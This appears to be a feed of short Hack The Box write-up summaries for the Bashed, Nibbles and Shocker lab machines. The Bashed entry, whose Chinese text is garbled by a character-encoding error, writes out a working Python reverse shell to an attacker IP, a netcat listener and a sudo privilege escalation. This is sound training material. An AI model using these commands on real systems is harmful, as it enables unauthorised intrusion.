item.title: Bashed
item.description: HTB: Bashed # Recon # http://10.10.10.68 æœ‰ä¸€ç¯‡å…³äºphpbashçš„æ–‡ç« gobuster -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt /devé¡µé¢ï¼š ç‚¹å‡»phpbash.phpç»™å‡ºä¸€ä¸ªé¡µé¢shellï¼Œå³phpbash Phpbash # å°è¯•è¿›å…¥/homeç›®å½•ä¸‹çš„ç”¨æˆ·ç›®å½•ï¼ŒæˆåŠŸæ‰¾åˆ°user.txt Shell Upgrade # åœ¨phpbashä¸­å‡†å¤‡ï¼š python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.10.14.157",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);' åœ¨kaliä¸­ç›‘å¬ï¼š nc -nvlp 4444 # connect to local from remote python -c 'import pty;pty.spawn("/bin/bash")' # pty shell PrivEsc # sudo -l User www-data may run the following commands on bashed: (scriptmanager : scriptmanager) NOPASSWD: ALL # switch user to scriptmanager sudo -u scriptmanager /bin/bash ls -l /scripts # autorun py gen txt test.

item.title: Nibbles
item.description: HTB: Nibbles # Nibbles is one of the easier boxes on HTB. It hosts a vulnerable instance of nibbleblog. Thereâ€™s a Metasploit exploit for it, but itâ€™s also easy to do without MSF, so Iâ€™ll show both. The privesc involves abusing sudo on a file that is world-writable. nmap # An initial nmap scan showed only web/http (80) and ssh (22): $ nmap -sV -sC -oA nmap/initial 10.10.10.75 Site - port 80 recon # web root # The root page simply returns a â€œhello worldâ€ message

item.title: Shocker
item.description: HTB: Shocker # The name Shocker gives away pretty quickly what Iâ€™ll need to do on this box. There were a couple things to look out for along the way. be careful when directory brute forcing, as the server is misconfigured in that the cgi-bin directory doesnâ€™t show up without a trailing slash. This means that tools like gobuster and feroxbuster miss it in their default state. Iâ€™ll show both manually exploiting ShellShock and using the nmap script to identify it is vulnerable.
